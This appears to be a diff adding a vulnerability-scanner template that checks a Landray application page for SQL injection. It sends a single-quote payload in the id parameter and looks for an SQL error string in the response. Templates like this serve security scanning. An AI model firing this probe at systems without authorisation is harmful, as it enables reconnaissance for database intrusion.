@@ -1,0 +1,19 @@
+id: landray-fl_define_flow_chart_show-sqli
+
+info:
+  name: landray-fl_define_flow_chart_show-sqli
+  author: landray-fl_define_flow_chart_show-sqli
+  severity: high
+
+requests:
+  - raw:
+      - |
+        GET /flow/fl_define_flow_chart_show.aspx?id=1' HTTP/1.1
+        Host: {{Hostname}}
+        TestHead: TestValue
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"order by fi_order")
